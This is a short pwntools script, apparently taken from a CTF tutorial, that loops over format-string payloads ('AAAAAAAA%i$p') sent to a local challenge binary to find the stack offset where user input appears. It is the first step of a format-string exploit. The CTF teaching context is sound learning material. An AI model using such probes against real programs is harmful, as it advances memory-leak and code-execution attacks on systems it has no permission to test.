# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak

from pwn import *

# Iterate over a range of integers 
for i in range(10):
    # Construct a payload that includes the current integer as offset
    payload = f"AAAAAAAA%{i}$p".encode()

    # Start a new process of the "chall" binary
    p = process("./reader")

    # Send the payload to the process
    p.sendline(payload)

    # Read and store the output of the process
    output = p.clean()
    log.info(f"Offset : {i}, Output : {output}")

    # Check if the string "41414141" (hexadecimal representation of "AAAA") is in the output
    if b"4141414141414141" in output:
        # If the string is found, log the success message and break out of the loop
        log.success(f"User input is at offset : {i}")
        break

    # Close the process
    p.close()
